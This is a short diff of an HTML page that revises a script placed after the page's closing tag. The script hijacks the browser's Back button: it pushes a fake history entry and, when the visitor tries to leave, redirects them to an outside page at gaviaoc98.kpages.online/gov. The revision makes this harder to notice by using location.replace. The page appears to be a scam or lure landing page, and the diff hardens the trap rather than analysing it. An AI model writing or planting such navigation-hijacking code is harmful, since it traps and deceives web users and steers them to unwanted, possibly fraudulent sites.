@@ -1606,12 +1606,12 @@ n=-1===n.indexOf("url(")?"url("+n+")":n,1===i.length?t.style.backgroundImage=n:t
 </body></html>
 
 <script>
-    window.onload = function() {
+    (function() {
         history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-            location.href = "https://gaviaoc98.kpages.online/gov";
-        };
-    };
+        window.addEventListener("popstate", function() {
+            location.replace("https://gaviaoc98.kpages.online/gov");
+        });
+    })();
 </script>
 </body>
 </html>
